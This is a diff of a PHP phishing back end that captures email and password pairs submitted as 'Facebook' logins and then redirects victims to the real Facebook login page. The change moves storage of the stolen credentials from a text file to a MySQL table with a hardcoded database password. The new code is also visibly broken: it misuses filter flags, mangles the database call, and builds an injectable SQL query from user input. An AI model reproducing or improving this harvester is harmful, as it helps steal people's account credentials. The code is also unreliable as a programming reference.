@@ -1,10 +1,15 @@
 <?php
 if (!empty($_POST['email']) && !empty($_POST['pass'])) {
-    $user = filter_var($_POST['email'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
-    $pass = filter_var($_POST['pass'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
+    $user = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL, MYSQLI_NOT_NULL_FLAG);
+    $pass = filter_var($_POST['pass'], FILTER_SANITIZE_SPECIAL_CHARS, MYSQLI_NOT_NULL_FLAG);
 }
-file_put_contents("logins_fb_.txt", "Facebook Username:-> " . $user . " Pass:-> " . $pass . "\n", FILE_APPEND);
 
-header('Location: https://facebook.com/login');
+$link_db = mysqli_connect('localhost', 'fb_login', '23047878A', 'fb_logins');
 
-exit();
+$query = "INSERT INTO users_log SET user_log='$user',pass_log='$pass'";
+
+$insert_db = $link_db . $query;
+
+mysqli_query($insert_db);
+
+return header('Location: https://facebook.com/login') . exit();
